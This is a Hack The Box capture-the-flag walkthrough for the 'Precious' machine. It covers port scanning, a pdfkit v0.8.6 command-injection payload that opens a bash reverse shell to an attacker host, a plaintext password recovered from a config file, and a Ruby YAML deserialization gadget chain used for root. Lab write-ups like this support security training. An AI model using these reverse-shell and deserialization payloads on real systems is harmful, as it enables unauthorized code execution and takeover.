---
title: "Precious"
date: 2025-01-19
categories: HTB
tags: ["htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb", "precious"]
---

# Precious

# Precious
# Credentials
| Username | Password           | Hash | Source           |
| -------- | ------------------ | ---- | ---------------- |
| ruby     |                    |      |                  |
| henry    | Q3c1AqGHtoI0aXAYFH |      | ~/.bundle/config |
|          |                    |      |                  |
# Notes
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
pdfkit v0.8.6
ruby
# Enumeration
- Testing the form for command injection works, and downloads a pdf file. 
- Using exiftool to view metadata of the downloaded pdf file, pdfkit v0.8.6 is revealed. 

## Nmap
# TCP
```sh
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.019s latency).
Scanned at 2024-07-05 06:58:11 AEST for 17s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Directory Fuzzing
## Gobuster
```sh
gobuster vhost -u http://precious.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
```


# Screenshots
![[/assets/images/precious1.png]]

# Burpsuite
![[/assets/images/precious2.png]]

# Form testing
![[/assets/images/precious3.png]]


![[/assets/images/precious5.png]]
![[/assets/images/precious4.png]]

![[/assets/images/precious6.png]]
downloads a pdf file. 

![[/assets/images/precious7.png]]


# Initial Access
- Following the PoC for pdfkit v0.8.6 gains initial shell as ruby user.
	-  Start a local python server, perform command injection for reverse shell.

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

![[/assets/images/precious8.png]]

```sh
# modified payload
http://10.10.14.16/www/%20`bash -c 'bash -i >& /dev/tcp/10.10.14.16/9001 0>&1'`
```

![[/assets/images/precious9.png]]

![[/assets/images/precious10.png]]



# Lateral Movement
-  `/.bundle/conf` within the ruby user's home folder contains credentials for henry user. 
- SSH as henry.

![[/assets/images/precious11.png]]

SSH as henry
![[/assets/images/precious12.png]]
# Privilege Escalation
- `sudo -l`
- Henry user has privileges to run ruby script. 
- The ruby script does not execute because `dependencies.yml` is missing. 
- Searching for ruby dependencies.yml exploit returns many relevant results. 
- Add reverse shell code to the payload and execute the ruby script. 

![[/assets/images/precious13.png]]

![[/assets/images/precious14.png]]

`YAML.load(File.read("dependencied.yml"))`

![[/assets/images/precious15.png]]
`dependencies.yml`

![[/assets/images/precious16.png]]

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md

![[/assets/images/precious17.png]]

Payload `dependencies.yml`
```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: http://10.10.14.16/www/%20`bash -c 'bash -i >& /dev/tcp/10.10.14.16/9002 0>&1'`
         method_id: :resolve
```

![[/assets/images/precious19.png]]

![[/assets/images/precious18.png]]

